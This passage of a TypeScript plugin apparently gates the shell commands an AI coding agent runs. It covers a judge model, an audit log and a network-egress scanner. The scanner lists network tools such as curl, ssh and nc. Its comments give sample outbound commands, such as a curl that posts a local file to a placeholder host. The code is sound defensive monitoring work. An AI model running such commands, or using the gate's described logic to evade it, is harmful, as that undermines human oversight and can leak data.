	return process.env.OMP_JEV_CONFIG ?? path.join(pluginRootDir(), "omp-classifier.json");
}

interface ClassifierConfigCache {
	mtimeMs: number;
	config: ClassifierConfig;
}
let classifierConfigCache: ClassifierConfigCache | undefined;

function normalizeClassifierConfig(raw: Record<string, unknown>): ClassifierConfig {
	// The one place `typesafeModel` is derived: the display value and the cache
	// trust state both read it from here, and no module-load snapshot exists to
	// go stale. It is never read from the file — the native judge owns model
	// resolution (`TYPESAFE_DEFAULT_MODEL` when the operator pinned one, else
	// the `jev-latest` alias the server maps to its current release) — so a
	// legacy key in a pre-existing config file is tolerated: it simply stops
	// being a knob, like an unknown key.
	const config: ClassifierConfig = {
		...CLASSIFIER_CONFIG_DEFAULTS,
		typesafeModel: process.env.TYPESAFE_DEFAULT_MODEL?.trim() || "jev-latest",
	};
	if (typeof raw.enabled === "boolean") config.enabled = raw.enabled;
	if (typeof raw.persistentGrants === "boolean") config.persistentGrants = raw.persistentGrants;
	if (typeof raw.shadowV3 === "boolean") config.shadowV3 = raw.shadowV3;
	// `judgeBackend` follows the same rule as every other key: a shape the
	// loader does not understand (a string, an unknown kind, an endpoint with no
	// model or a non-URL baseUrl) keeps the default rather than half-applying an
	// override that would fail closed on every command. The parse also
	// canonicalizes the base URL, so one endpoint has exactly one identity.
	const backend = parseJudgeBackend(raw.judgeBackend);
	if (backend !== undefined) config.judgeBackend = backend;
	if (typeof raw.timeoutMs === "number" && Number.isFinite(raw.timeoutMs) && raw.timeoutMs > 0) {
		config.timeoutMs = raw.timeoutMs;
	}
	if (
		typeof raw.maxCommandLength === "number" &&
		Number.isFinite(raw.maxCommandLength) &&
		raw.maxCommandLength >= MIN_COMMAND_LENGTH &&
		raw.maxCommandLength <= MAX_COMMAND_LENGTH_CEILING
	) {
		config.maxCommandLength = raw.maxCommandLength;
	}
	if (
		typeof raw.evidenceUserMessages === "number" &&
		Number.isFinite(raw.evidenceUserMessages) &&
		raw.evidenceUserMessages >= MIN_EVIDENCE_USER_MESSAGES &&
		raw.evidenceUserMessages <= MAX_EVIDENCE_USER_MESSAGES
	) {
		config.evidenceUserMessages = raw.evidenceUserMessages;
	}
	// Policy overrides: known keys only, numbers only, in range. A non-object
	// keeps the default — `"jevPolicy": "strict"` is the same hand-edit
	// garbage class as `typesafeModel: 7`.
	if (raw.jevPolicy && typeof raw.jevPolicy === "object" && !Array.isArray(raw.jevPolicy)) {
		const policy: Partial<JevPolicy> = {};
		const overrides = raw.jevPolicy as Record<string, unknown>;
		for (const [key, range] of Object.entries(JEV_POLICY_RANGES)) {
			const value = overrides[key];
			if (typeof value !== "number" || !Number.isFinite(value)) continue;
			if (value < range.min || value > range.max) continue;
			policy[key as keyof JevPolicy] = value;
		}
		config.jevPolicy = policy;
	}
	return config;
}

export function readClassifierConfig(): ClassifierConfig {
	try {
		const stat = fs.statSync(classifierConfigPath());
		if (classifierConfigCache && classifierConfigCache.mtimeMs === stat.mtimeMs) {
			return classifierConfigCache.config;
		}
		const raw = JSON.parse(fs.readFileSync(classifierConfigPath(), "utf8")) as Record<string, unknown>;
		const config = normalizeClassifierConfig(raw);
		classifierConfigCache = { mtimeMs: stat.mtimeMs, config };
		return config;
	} catch {
		// Folded through normalizeClassifierConfig so `typesafeModel` is derived
		// at read time here too, never a stale module-load snapshot.
		return normalizeClassifierConfig({});
	}
}

function writeClassifierConfig(patch: Record<string, unknown>): ClassifierConfig {
	const before = readClassifierConfig();
	const raw: Record<string, unknown> = {};
	for (const key of ["enabled", "judgeBackend", "jevPolicy", "timeoutMs", "maxCommandLength", "evidenceUserMessages", "persistentGrants", "shadowV3"] as const) {
		if (key in patch) raw[key] = patch[key];
	}
	const next = normalizeClassifierConfig({ ...before, ...raw });
	fs.mkdirSync(path.dirname(classifierConfigPath()), { recursive: true });
	fs.writeFileSync(classifierConfigPath(), `${JSON.stringify(next, null, 2)}\n`);
	classifierConfigCache = undefined;
	return next;
}

// ---------------------------------------------------------------------------
// Decision audit log (issue #33)
//
// One JSON line per gate decision at <config root>/omp-classifier/
// decisions.jsonl. The directory mirrors classifierConfigPath()'s resolution —
// dirname(OMP_JEV_CONFIG) when the test override is set,
// <config root>/omp-classifier otherwise — so tests point one env var at a
// temp dir and find every artifact there. Append-only; the writer is
// fire-and-forget (see logDecision inside the plugin factory).
// ---------------------------------------------------------------------------

/** Directory holding every plugin artifact: config, decisions.jsonl, status.json.
 *  Resolved from the same host root as the config file, so a profile or an XDG
 *  migration never splits the config from its audit log. Exported alongside
 *  classifierConfigPath() as the same test seam. */
export function classifierDataDir(): string {
	const override = process.env.OMP_JEV_CONFIG;
	return override ? path.dirname(override) : path.join(pluginRootDir(), PLUGIN_NAME);
}

export function decisionsLogPath(): string {
	return path.join(classifierDataDir(), "decisions.jsonl");
}

function statusReportPath(): string {
	return path.join(classifierDataDir(), "status.json");
}

/** One decisions.jsonl line; the field order is the log contract (issue #33).
 *  `verdict` is null whenever no model verdict existed (static rules, caps,
 *  dialogs decided by a human); `ms` is wall-clock for the scope that logged
 *  the line (tool_call entry for gate lines, dialog entry for its outcome).
 *  `userMessageIds` and `authorization` (Phase 0 item 5) make a false
 *  positive auditable from the log alone: which user messages were in
 *  evidence for this tool call, and how the decision read them, without
 *  rebuilding the session transcript. There is no `branch`/decision-path
 *  field: `layer` already names the path that decided (critical,
 *  environment, rule, granted, verdict, cached, unclassified, dialog,
 *  headless, cap, cwd, internal-error, late-verdict), so a second field would
 *  only duplicate it under different spelling. `late-verdict` is the one that
 *  arrived after its deadline had already opened a dialog (issue #62): it
 *  says which of the three late outcomes happened, in `why`, and carries the
 *  answer's own `verdict`/`jev` the way an on-time verdict line would. */
export interface DecisionRecord {
	ts: string;
	/** Unique line/action id for joining verdict and interaction entries. */
	decisionId?: string;
	/** Session that produced the decision, when the host exposed one. */
	sessionId?: string;
	/** Policy identity that produced this line; lets status/eval distinguish
	 *  mixed-version decisions after a live reload or long session. */
	policyVersion?: string;
	policyHash?: string;
	modelId?: string;
	/** Stable machine token for the decision (`jev:safe`, `jev:hazard:<name>`,
	 *  `jev:below-floor`, `jev:unavailable`). `why` stays human-readable;
	 *  consumers that tally behavior match on this. */
	reasonCode?: string;
	/** Jev telemetry for the verdict on this line: the probability vector,
	 *  hazard nouls, confidence, blast radius, usage and latency the decision
	 *  was derived from. Absent on lines with no verdict (static rules, caps,
	 *  dialogs decided by a human). */
	jev?: Judgement["jev"];
	/** Ids of the user messages that were in evidence for this tool call,
	 *  taken verbatim from `UserEvidenceSnapshot.ids` (issue #31 plumbing).
	 *  Ids only, never message text and never a hash of it — the log is an
	 *  audit trail, not a second copy of the transcript. Present whenever the
	 *  snapshot held at least one id, including every early return (critical
	 *  pattern, env override, static rule, grant, cap, refusal dialog) so a
	 *  false positive can be traced to exactly what the gate saw. */
	userMessageIds?: string[];
	/** `Judgement.authorization` carried onto the line when a judgement
	 *  existed for this decision (a verdict, or a dialog/headless outcome
	 *  that followed one). Absent on lines with no judgement (critical, env,
	 *  static rule, grant, cap, unclassified). */
	authorization?: Judgement["authorization"];
	/** The jev-v3 shadow (plan Phase 2 step 8), carried like `authorization`
	 *  onto every line that followed a judgement. Decides nothing. */
	v3?: ShadowV3;
	approval?: "allow-once" | "allow-session" | "always-allow" | "deny" | "headless" | "unavailable";
	tool: "bash" | "eval";
	decision: "allow" | "block";
	layer: string;
	why: string;
	cmd: string;
	cwd: string;
	/** The eval payload's OWN spawn directory (issue #14), when the payload
	 *  named one: `cwd` above is the directory this decision judged in, and for
	 *  a payload whose spawns declare their own directory that is where the
	 *  judged command would run, not where the payload's own process runs. Kept
	 *  as its own field so a reader can tell a directory the payload chose from
	 *  one the session supplied without re-reading the (truncated) `cmd`. */
	spawnCwd?: string;
	verdict: Verdict | null;
	cached: 0 | 1;
	ms: number;
	/** Set when the plugin file changed on disk after this session loaded it. */
	staleCode?: 0 | 1;
	/** What the code floor would have done with this command (plan Phase 2
	 *  step 1, logged in shadow per #55). It decides nothing: the line records
	 *  the floor's verdict beside the live one so the disagreement can be
	 *  measured before the `jev-v3` flip. */
	floor?: { asks: boolean; entries: FloorEntry[] };
}

type DecisionLogInput = Omit<DecisionRecord, "ts">;

/** Tail window for `/classifier status`: counts over the most recent lines. */
const STATUS_TAIL_LINES = 500;
const STATUS_LAST_DECISIONS = 10;

export interface StatusReport {
	config: ClassifierConfig;
	policyVersion: string;
	policyHash: string;
	/** The judge identity a verdict is cached under: which backend, and the
	 *  model or endpoint that answers it. The id the cache key trusts. */
	backendId: string;
	/** Which output contract the live battery + derivation implement. */
	contract: string;
	cacheSizes: Record<string, number>;
	/** SessionIds currently paused via `/classifier off`, sorted. */
	pausedSessions: string[];
	decisions: { scanned: number; allow: number; block: number };
	last: DecisionRecord[];
}

/**
 * Build the `/classifier status` dump: effective config, per-session verdict
 * cache sizes, sessionIds paused via `/classifier off`, allow/refusal counts
 * over the last 500 audit lines, and the last 10 decisions. Tolerates a torn
 * final line (a crash mid-append) and a missing log — both read as fewer
 * decisions, never a throw. Pure read:
 * writing status.json and notifying is the command handler's job.
 */
export function buildStatusReport(): StatusReport {
	const cacheSizes: Record<string, number> = {};
	for (const [sessionId, entries] of cache) cacheSizes[sessionId] = entries.size;
	const recent: DecisionRecord[] = [];
	try {
		const lines = fs.readFileSync(decisionsLogPath(), "utf8").split("\n").slice(-STATUS_TAIL_LINES);
		for (const lineText of lines) {
			if (lineText.trim() === "") continue;
			try {
				recent.push(JSON.parse(lineText) as DecisionRecord);
			} catch {
				// Torn or non-JSON line: skip it, keep the rest.
			}
		}
	} catch {
		// No audit log yet: zero counts.
	}
	const allow = recent.filter(record => record.decision === "allow").length;
	const config = readClassifierConfig();
	return {
		config,
		policyVersion: CLASSIFIER_POLICY_VERSION,
		policyHash: CLASSIFIER_POLICY_HASH,
		backendId: judgeBackendFor(config.judgeBackend).id,
		contract: QUESTIONS_CONTRACT,
		cacheSizes,
		pausedSessions: [...sessionOff].sort(),
		decisions: { scanned: recent.length, allow, block: recent.length - allow },
		last: recent.slice(-STATUS_LAST_DECISIONS),
	};
}

// ---------------------------------------------------------------------------
// Host lockfile
//
// `omp plugin disable` rewrites omp-plugins.lock.json, but OMP binds a plugin's
// interceptors at session start and does not unbind them when that file
// changes. A session that was already running keeps classifying, which reads as
// the plugin ignoring its own setting. We cannot honor the flag ourselves: a
// project-scope lockfile may legitimately re-enable a plugin the user-scope one
// disables, and reproducing OMP's scope resolution here would couple us to the
// host's internal layout. So we say so, and point at the fix that works without
// losing the session.
// ---------------------------------------------------------------------------

const PLUGIN_NAME = "omp-classifier";

/**
 * Resolve the lockfile the way the host does. `OMP_PROFILE`/`PI_PROFILE`,
 * `PI_CONFIG_DIR`, and `XDG_DATA_HOME` all move it, so a hand-built
 * `~/.omp/plugins/...` is wrong for exactly the users this notice targets: it
 * reads the default-profile file, stays silent under `--profile`, and in the
 * inverse case warns about a path the session never consulted.
 *
 * There is no plugin-local copy to worry about. `legacy-pi-compat.ts` rewrites
 * `@oh-my-pi/*` through `resolveCanonicalPiSpecifier` (the bundled virtual
 * module in compiled mode, `Bun.resolveSync` against the host dir otherwise)
 * precisely to avoid "pulling a duplicate copy from plugin node_modules". So
 * this resolves to the HOST's live singleton, and even a runtime `setProfile()`
 * is reflected. That is stronger than the header's rule about `settings` needs,
 * not an exception to it: `settings` fails for its own reason, not because
 * host imports are duplicated.
 *
 * `OMP_JEV_TEST_LOCKFILE` is TEST-ONLY, and now enforced as such
 * rather than merely documented: it is honored only under `NODE_ENV=test`,
 * which bun sets for `bun test`. Documented-only was not enough, because a
 * stray export in a real session redirects the read and produces the exact
 * failure this function exists to prevent — a notice naming a path the session
 * never consulted. Contrast `OMP_JEV_CONFIG`, a legitimate user
 * knob: that redirects the plugin's OWN file, where the plugin is the sole
 * reader. This redirects a read of a HOST file the plugin only observes.
 */
function pluginLockfilePath(): string {
	if (process.env.NODE_ENV === "test" && process.env.OMP_JEV_TEST_LOCKFILE) {
		return process.env.OMP_JEV_TEST_LOCKFILE;
	}
	return getPluginsLockfile();
}

interface LockfileCache {
	mtimeMs: number;
	size: number;
	disabled: boolean;
}
const lockfileCaches = new Map<string, LockfileCache>();

/** Which lockfile answered, so the notice can name the file it actually read. */
interface LockfileVerdict {
	disabled: boolean;
	path: string;
}

/**
 * Walk up from cwd for the project anchor the host uses (a directory holding
 * `.omp` or `.git`) and return that scope's lockfile path.
 *
 * Without this the notice had a false negative exactly where it hurts: a
 * project-only install is disabled by `MarketplaceManager.setPluginEnabled`
 * writing `<projectRoot>/.omp/plugins/omp-plugins.lock.json`, which
 * `getPluginsLockfile()` never returns, so the user got silence.
 */
function projectLockfilePath(cwd: string | undefined): string | undefined {
	if (!cwd) return undefined;
	let dir = path.resolve(cwd);
	for (;;) {
		if (fs.existsSync(path.join(dir, ".omp")) || fs.existsSync(path.join(dir, ".git"))) {
			return path.join(dir, ".omp", "plugins", "omp-plugins.lock.json");
		}
		const parent = path.dirname(dir);
		if (parent === dir) return undefined;
		dir = parent;
	}
}

/** Read one lockfile. Missing, unreadable or malformed reads as "not disabled". */
async function lockfileSaysDisabled(lockPath: string): Promise<boolean> {
	let stat: fs.Stats;
	try {
		// Known and accepted: in the common not-disabled case the session never
		// enters staleDisableWarned, so the leading short-circuit never fires
		// and this stat runs once per bash call for the session's life. Caching
		// the negative would end that, and would also end the feature — noticing
		// a disable that happens MID-session is the entire point.
		//
		// Async keeps the event loop free, but be clear about what it does NOT
		// buy: the handler still parks here, and the runner bounds each
		// tool_call and returns { block: true } on timeout, so on a stalled
		// mount this can still block the bash call it rode in on. That exposure
		// is pre-existing — readClassifierConfig statSyncs the same config root
		// on every call — so this is not the place to fix it.
		stat = await fs.promises.stat(lockPath);
	} catch {
		// Nothing read or parsed, and skipping the cache keeps a lockfile
		// created later visible.
		return false;
	}
	// Size and path join mtime in the key: mtime granularity is 1-2s on NFS and
	// some bind mounts and a rewrite inside that window is exactly what
	// `omp plugin disable` does, and the path can move under setProfile().
	const cached = lockfileCaches.get(lockPath);
	if (cached && cached.mtimeMs === stat.mtimeMs && cached.size === stat.size) {
		return cached.disabled;
	}
	let disabled = false;
	try {
		disabled = pluginEntryIsDisabled(JSON.parse(await fs.promises.readFile(lockPath, "utf8")) as Record<string, unknown>);
	} catch {
		// Cached anyway, keyed on the same stat, or a malformed lockfile is
		// re-parsed on every bash call.
		disabled = false;
	}
	lockfileCaches.set(lockPath, { mtimeMs: stat.mtimeMs, size: stat.size, disabled });
	return disabled;
}

/**
 * Both scopes. The host reads a project lockfile when one exists and lets it
 * shadow the user one, so checking only the user scope meant a project-scope
 * disable produced silence — the exact symptom this notice exists to explain.
 * Project is checked first because that is the one that would be in force.
 */
async function lockfileDisablesPlugin(cwd: string | undefined): Promise<LockfileVerdict> {
	const projectPath = projectLockfilePath(cwd);
	if (projectPath && (await lockfileSaysDisabled(projectPath))) {
		return { disabled: true, path: projectPath };
	}
	const userPath = pluginLockfilePath();
	return { disabled: await lockfileSaysDisabled(userPath), path: userPath };
}

function pluginEntryIsDisabled(raw: Record<string, unknown>): boolean {
	const plugins = raw.plugins;
	if (!plugins || typeof plugins !== "object") return false;
	const entry = (plugins as Record<string, unknown>)[PLUGIN_NAME];
	if (!entry || typeof entry !== "object") return false;
	// Matches the host, which does `if (runtimeState && !runtimeState.enabled)`
	// with no default for `enabled`. A hand-edited entry that omits it, or
	// sets 0, is disabled as far as the loader is concerned.
	return !(entry as Record<string, unknown>).enabled;
}

export function formatClassifierConfig(config: ClassifierConfig): string {
	const policy = jevPolicyFor(config);
	return [
		`enabled: ${config.enabled}`,
		`typesafeModel: ${config.typesafeModel}`,
		`judgeBackend: ${judgeBackendFor(config.judgeBackend).id}`,
		`timeoutMs: ${config.timeoutMs}`,
		`maxCommandLength: ${config.maxCommandLength}`,
		`evidenceUserMessages: ${config.evidenceUserMessages}`,
		`persistentGrants: ${config.persistentGrants}`,
		`shadowV3: ${config.shadowV3}`,
		`contract: ${QUESTIONS_CONTRACT}`,
		`policyHash: ${CLASSIFIER_POLICY_HASH}`,
		`policy: ${JSON.stringify(policy)}`,
	].join("\n");
}

/**
 * The output contract this plugin and jev.ts implement together: one request
 * carrying the question battery, one response carrying typed answers with
 * probabilities. Both sides move in lockstep — the battery decides what
 * `deriveJevDecision` is allowed to read, so a question whose answer shape
 * changes changes the verdict — and `/classifier status` surfaces which
 * contract is live.
 */
export const QUESTIONS_CONTRACT = "questions+probabilities";

/** Hash of the loaded decision policy: the question battery and the thresholds
 *  it is read through, over jev.ts's policy version. Keeping the hash separate
 *  from the semantic version lets mixed-session replay and shadow reports
 *  distinguish battery edits that forgot to bump a version. */
export const CLASSIFIER_POLICY_HASH = jevQuestionsHash();

function truncated(value: string, max: number): string {
	return value.length > max ? `${value.slice(0, max)}…` : value;
}

/** Joins the kept head and tail of a capped user message. The marker stays
 *  visible in the text the judge is shown, which is the point: a truncated
 *  message must not read as if the dropped middle never existed. */
const EVIDENCE_ELISION = "\n…\n";

/** The path the kernel will open, following symlinks. A path that does not
 *  exist yet resolves its parent and keeps its own name, so a delete target
 *  that is already gone still gets its real parent checked. */
function realPathOf(candidate: string): string {
	try {
		return fs.realpathSync.native(candidate);
	} catch {
		const parent = path.dirname(candidate);
		return parent === candidate ? candidate : path.join(realPathOf(parent), path.basename(candidate));
	}
}

/** Cap a long message by keeping its first and last max/2 chars. A user often
 *  states the actual instruction last, and a head-only cut dropped it. */
function headAndTail(value: string, max: number): string {
	// Count and cut by code point, so an emoji at either cut is kept whole instead of
	// leaving a lone surrogate that no quote can match.
	const points = Array.from(value);
	if (points.length <= max) return value;
	const head = Math.floor(max / 2);
	return `${points.slice(0, head).join("")}${EVIDENCE_ELISION}${points.slice(points.length - (max - head)).join("")}`;
}

/**
 * evidence.userMessages exactly as the state carries them: the newest N
 * user messages (issue #31), absent entirely when the limit is 0 or there is
 * nothing to send. classify builds its state from this, and the tool_call path
 * snapshots it once per call so the cache key, refusal memory, and grants all
 * agree about what the judge actually saw.
 */
function evidenceUserSnapshot(ctx: ExtensionContext): UserEvidenceSnapshot | undefined {
	const limit = readClassifierConfig().evidenceUserMessages;
	if (limit <= 0) return undefined;
	let snapshot: UserEvidenceSnapshot;
	try {
		snapshot = collectTaskEvidence(ctx.sessionManager.getBranch() as ReadonlyArray<EvidenceBranchEntry>, limit);
	} catch {
		// Isolated contexts may omit branch history. Evidence stays enabled but
		// empty, so a judge cannot cite a user who was not actually supplied.
		snapshot = { messages: [], ids: [] };
	}
	return snapshot.messages.length > 0 ? snapshot : undefined;
}

/** The evidence list every provenance decision is made against: the collected
 *  user messages, an empty list when evidence is on but no user wrote anything
 *  (a headless subagent, whose only role-user message is its parent's brief),
 *  undefined when evidence is off. Cache keys hash this, so a verdict never
 *  survives a change in what the judge was shown. */
function citableEvidence(userMessages: string[] | undefined): string[] | undefined {
	return userMessages ?? (readClassifierConfig().evidenceUserMessages > 0 ? [] : undefined);
}

/**
 * Fingerprint of every decision input that is not already in the cache key:
 * the evidence user messages AND the agent-authored operatorContext — both
 * ride in the classifier record, so both are decision-conditional. A verdict
 * is evidence-conditional, and a key that ignored an input let a cached SAFE
 * outlive its authorization (or survive its revocation). Two independently
 * mixed 32-bit lanes (FNV-1a and a multiplicative sum) give 64 bits; the
 * command text in the same key does the rest.
 */
function evidenceFingerprint(userMessages: readonly string[] | undefined, operatorContext?: string, userMessageIds?: readonly string[]): string {
	// null (evidence off) and [] (on, but no user wrote anything) must hash
	// apart: the judge was shown different states, and that list also scopes a
	// grant, so the two must never share a cached verdict or an approval scope.
	const material = JSON.stringify([userMessages ?? null, operatorContext ?? "", userMessageIds ?? null]);
	let h1 = 0x811c9dc5;
	let h2 = 0x01000193;
	for (const ch of material) {
		const c = ch.codePointAt(0) ?? 0;
		h1 = Math.imul(h1 ^ c, 0x01000193);
		h2 = Math.imul(h2 + c, 0x85ebca6b);
	}
	return `${(h1 >>> 0).toString(36)}${(h2 >>> 0).toString(36)}`;
}

// --- network scan -----------------------------------------------------------
//
// Deterministic and prompt-free: does this command talk to a remote endpoint?
// It is no longer a gate input — the battery's egress hazards
// (contacts_remote_endpoint, sends_local_data_outbound) replaced the post-parse
// egress-consistency check — but it stays exported because replay consumers,
// the eval harness, and tests use it as the cheap, explainable answer.

/**
 * Verbs whose lead position means the command talks to a remote endpoint.
 * Deliberately narrow: git is excluded even though push/pull touch the
 * network, because plain push is routine developer work and this scan must not
 * become an over-flag family on it. gh counts as outbound only when it carries
 * an explicit hosted-API write marker (ghApiWrites); a read or a carved
 * workflow write is inert, like a fetched read.
 */
const NETWORK_VERBS: Record<string, true> = {
	curl: true, wget: true, ssh: true, scp: true, sftp: true,
	nc: true, ncat: true, netcat: true, telnet: true, gh: true,
};

/**
 * gh hosted-API write markers, checked on TOKENS (quote-proof): `-X "POST"`
 * is shell-identical to `-XPOST`, and a raw-text scan misses whichever shape
 * it does not spell out. A gh invocation without a marker is a read or a
 * workflow write (pr view/comment/edit, api GET) — inert by the same
 * reasoning as a cleared fetch. `-X POST`/`-f`/
 * `--field` shape is the one that can carry local data out, and stays
 * outbound.
 */
function ghApiWrites(args: readonly string[]): boolean {
	for (let k = 0; k < args.length; k++) {
		const a = args[k];
		if (a === "-f" || a === "-F") return true;
		if ((a.startsWith("-f") || a.startsWith("-F")) && a.length > 2) return true;
		// Bundled shorts carry the write flag inside (`-ifbody=secret`).
		if (a.startsWith("-") && !a.startsWith("--") && a.length > 2 &&
			expandShortBundle(a).some(f => f === "-f" || f === "-F" || f === "-X")) return true;
		if (a === "--field" || a === "--input" || a === "--raw-field") return true;
		if (a.startsWith("--field=") || a.startsWith("--input=") || a.startsWith("--raw-field=")) return true;
		let value: string | undefined;
		if (a === "-X" || a === "--method") value = args[k + 1];
		else if (a.startsWith("--method=")) value = a.slice(9);
		else if (a.startsWith("-X=")) value = a.slice(3);
		else if (a.startsWith("-X") && a.length > 2) value = a.slice(2);
		// A method flag means a write unless the value is a literal GET/HEAD;
		// indeterminate values (`--method="$METHOD"`) fail closed.
		if (value !== undefined && !/^(?:GET|HEAD)$/iu.test(value.trim())) return true;
	}
	return false;
}

/** Write-out format strings can write local files (`%output{path}`, curl
 *  8.3+), which is why `-w`/`--write-out` is absent from the read-only flag
 *  table. A format string made only of literals and `%{simple_name}`
 *  variables carries no such channel; this predicate admits exactly that.
 *  Anything else — %output, %% escapes, unknown syntax — fails closed. */
const WRITE_OUT_CLEAN_RE = /^(?:[^%@$`]|%\{[a-z0-9_]+\})*$/iu;
/** Send-data flags: a request carrying one is not a read even when the
 *  response lands in the null device — the body still hits the wire. The
 *  null-device clearing branches stand down when one of these is present. */
const SEND_DATA_FLAGS: Record<string, true> = {
	"-d": true, "--data": true, "--data-raw": true, "--data-urlencode": true,
	"--json": true, "-F": true, "--form": true, "--request": true, "-X": true,
	"--method": true, "--body-data": true, "--post-file": true,
};

/** `$(…)`, `<(…)` and backtick SPANS of `text`: substitution is outside the
 *  tokenizer's scope, so a span is unusable as a lead word and must be
 *  scanned as its own command. Shells parse the spans (quoting and nesting
 *  included) in shell-ast, which owns the parser; this keeps one collector in
 *  the repository. */

/** Does one command segment hold a network verb within reach? Its own lead
 *  word and every later pipe stage's lead run the same clearing rules: a
 *  read-shaped fetch clears (whole segment — isPlainReadOnlyFetch judges the
 *  pipeline too), the `gh` carveout decides on its tokens, and every other
 *  NETWORK_VERBS lead fails closed. Shared by the owner scan and the
 *  substitution-span scan below, which must never disagree. Later stages skip
 *  leading `VAR=` assignments first, as the stage-0 lead does: the stage's
 *  first token is the assignment, not the verb (`printf hi | FOO=bar ssh
 *  host cat`). */
function segmentLeadsOutbound(segment: string): boolean {
	const stages = splitPipeStages(segment);
	const leadWords = tokenizeShellSegments(stages[0] ?? "")[0] ?? [];
	let skipped = 0;
	while (skipped < leadWords.length && /^[a-z_][a-z0-9_]*=/iu.test(leadWords[skipped])) skipped++;
	const lead = commandBasename((leadWords[skipped] ?? "").toLowerCase());
	if ((lead === "curl" || lead === "wget") && isPlainReadOnlyFetch(segment)) return false;
	if (lead === "gh" && !ghApiWrites(leadWords)) return false;
	if (NETWORK_VERBS[lead]) return true;
	for (let i = 1; i < stages.length; i++) {
		const stageTokens = tokenizeShellSegments(stages[i])[0] ?? [];
		let stageSkipped = 0;
		while (stageSkipped < stageTokens.length && /^[a-z_][a-z0-9_]*=/iu.test(stageTokens[stageSkipped])) stageSkipped++;
		const stageLead = commandBasename((stageTokens[stageSkipped] ?? "").toLowerCase());
		if (stageLead === "gh" && !ghApiWrites(stageTokens)) continue;
		if (NETWORK_VERBS[stageLead]) return true;
	}
	return false;
}

export function commandHasOutboundNetwork(command: string): boolean {
	// A document that mentions `wget` is not a fetch: heredoc bodies come off
	// the raw command first, and an executed one is scanned as its own command.
	// A QUOTED body's `$(curl …)` never runs, so stripping it first keeps the
	// documentation false positive dead even under the span scan. An unquoted
	// body's `$(curl …)` does run at write time — the strip deliberately
	// leaves it in place, and the span scan reads it there (issue #59).
	const normalized = withoutWrittenHeredocBodies(command).replace(/\\\r?\n/gu, "");
	for (const text of splitTopLevelCommands(normalized)) {
		// `||` passes splitTopLevelCommands unsplit, so the fallback half of
		// `false || ssh host cat` would be invisible here; split it locally.
		for (const segment of splitOrFallbacks(text)) {
			const inert = segment.replace(/(^|\s)2>&1(?=\s|$)/gu, " ");
			if (segmentLeadsOutbound(inert)) return true;
			// A network verb inside `$(…)` or backticks is not a segment lead
			// in any position — argument, later stage, or heredoc body — so its
			// span runs the same lead-word scan: `echo $(curl -d @x https://x)`
			// is invisible to the lead word alone (issue #59).
			for (const span of substitutionSpans(inert)) {
				if (segmentLeadsOutbound(span)) return true;
			}
		}
	}
	return false;
}

// --- outside-cwd write target ----------------------------------------------

/**
 * True only when `target` provably lands outside `cwd`: absolute or ~ paths,
 * with /dev/null (and the fd aliases), /tmp and /var/tmp (both macOS and Linux
 * spellings) excluded — writing a log to /tmp is routine and must not ask.
 * Relative targets are inside cwd by definition, and anything this cannot
 * prove stays "inside": its consumer is the rm-family dialog shape, where a
 * wrong "outside" spends a human's attention on a routine deletion.
 */
function writeTargetOutsideCwd(target: string, cwd: string): boolean {
	const expanded = target.startsWith("~") ? path.join(os.homedir(), target.slice(1)) : target;
	if (!expanded.startsWith("/")) return false;
	const resolved = path.resolve(expanded);
	const base = path.resolve(cwd);
	if (resolved === base || resolved.startsWith(`${base}/`)) return false;
	if (
		resolved === "/dev/null" || resolved === "/dev/stdout" || resolved === "/dev/stderr" || resolved === "/dev/tty" ||
		resolved.startsWith("/tmp/") || resolved === "/private/tmp/" || resolved.startsWith("/private/tmp/") ||
		resolved.startsWith("/var/tmp/") || resolved.startsWith("/private/var/tmp/")
	) {
		return false;
	}
	return true;
}

/** Attach stable machine fields after every decision path. classify() derives
 * these from the Jev decision it just made, so they are FILLED and never
 * overwritten: a hand-built judgement (replay, the eval harness, tests) gets
 * the verdict-only fallback instead of having to invent a reason code. */
export function annotateJudgement(judgement: Judgement): Judgement {
	const reasonCode =
		judgement.reasonCode ??
		(judgement.verdict === "SAFE"
			? "effects.routine"
			: judgement.verdict === "UNSAFE"
				? "effects.irreversible"
				: judgement.verdict === "UNAVAILABLE"
					? "jev:unavailable"
					: "review.ambiguous");
	const risk =
		judgement.risk ??
		(judgement.verdict === "SAFE"
			? "routine"
			: judgement.verdict === "UNSAFE"
				? "irreversible"
				: judgement.verdict === "UNAVAILABLE"
					? "unavailable"
					: "review");
	// Authorization is only knowable from the battery answer that decided it.
	// Without one (a hand-built judgement) the honest default is that the
	// action never depended on it — never "grounded", which would claim the
	// judge verified an authorization nobody asked it about. An outage judged
	// nothing, so it carries no label at all.
	if (judgement.verdict === "UNAVAILABLE") return { ...judgement, risk, reasonCode };
	const authorization = judgement.authorization ?? "not-required";
	return { ...judgement, risk, reasonCode, authorization };
}

export interface ReplayDecisionInput {
	tool: "bash" | "eval";
	command: string;
	cwd: string;
	/** Resolved caller environment keys; values are intentionally excluded. */
	envKeys?: readonly string[];
	maxCommandLength?: number;
	/** The model/post-parse result. Omitted means the model was unavailable. */
	judgement?: Judgement;
	/** A scoped machine refusal or prior human refusal applies. */
	priorRefusal?: boolean;
	/** A previously granted exact action outranks model verdicts, below caps and
	 *  deterministic critical/environment overlays. */
	grant?: "session" | "persistent";
	/** Optional simulated human outcome for evaluation/replay. */
	approval?: "allow-once" | "allow-session" | "always-allow" | "deny";
	/** Deterministic risk overlays discovered by the caller. */
	riskFlags?: readonly string[];
	/** Host-native static decision for a specific rule/approval pattern. */
	staticRule?: "allow" | "prompt" | "deny";
	headless?: boolean;
}

export interface ReplayDecision {
	decision: "allow" | "block";
	layer: "cap" | "critical" | "environment" | "rule" | "granted" | "approval" | "verdict" | "unclassified";
	/** What the host sees after the plugin returns. */
	hostHandoff: "run" | "permission" | "headless-block";
	why: string;
	}

/** Shared deterministic tail used by production and the evaluation harness.
 * It never makes a missing model look safe, and it keeps interactive versus
 * headless outcomes explicit instead of collapsing both into `ask`. */
export function replayDecision(input: ReplayDecisionInput): ReplayDecision {
	const limit = input.maxCommandLength ?? DEFAULT_MAX_COMMAND_LENGTH;
	if (input.command.length > limit) {
		return { decision: "block", layer: "cap", hostHandoff: "headless-block", why: `command exceeds ${limit}-character review limit` };
	}
	if (input.staticRule === "deny") {
		return { decision: "block", layer: "rule", hostHandoff: "headless-block", why: "host static deny rule matched" };
	}
	if (input.riskFlags?.includes("critical")) {
		return { decision: "block", layer: "critical", hostHandoff: input.headless ? "headless-block" : "permission", why: "built-in critical pattern matched" };
	}
	if ((input.envKeys?.length ?? 0) > 0) {
